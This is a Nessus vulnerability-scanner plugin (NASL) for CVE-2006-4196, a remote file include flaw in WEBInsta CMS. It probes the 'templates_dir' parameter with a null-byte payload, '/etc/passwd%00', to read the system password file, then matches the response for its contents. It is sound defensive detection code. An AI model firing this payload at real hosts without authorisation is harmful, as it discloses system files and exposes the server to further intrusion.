#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is prone to a
remote file include attack. 

Description :

The remote host is running WEBInsta CMS, a content management system
written in PHP. 

The version of WEBInsta CMS installed on the remote host fails to
sanitize user-supplied input to the 'templates_dir' parameter of the
'index.php' script before using it to include PHP code.  Regardless of
PHP's 'register_globals' setting, an unauthenticated attacker may be
able to exploit these flaws to view arbitrary files on the remote host
or to execute arbitrary PHP code, possibly taken from third-party
hosts. 

See also :

http://www.milw0rm.com/exploits/2175
http://my.opera.com/atomo64/blog/show.dml/443167

Solution :

Upgrade to Webinsta CMS version 0.4.0a or later.

Risk factor :

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description)
{
  script_id(22206);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-4196");
  script_bugtraq_id(19489);

  script_name(english:"WEBInsta CMS templates_dir Parameter Remote File Include Vulnerability");
  script_summary(english:"Tries to read a local file using WEBInsta CMS");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/webinsta", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  req = http_get(
    item:string(
      dir, "/index.php?",
      "templates_dir=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream".
    egrep(pattern:"main\(/etc/passwd\\0template.def\.php.+ failed to open stream", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      contents = res - strstr(res, "<!DOCTYPE");

    if (contents)
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
    else report = desc;

    security_hole(port:port, data:report);
    exit(0);
  }
}
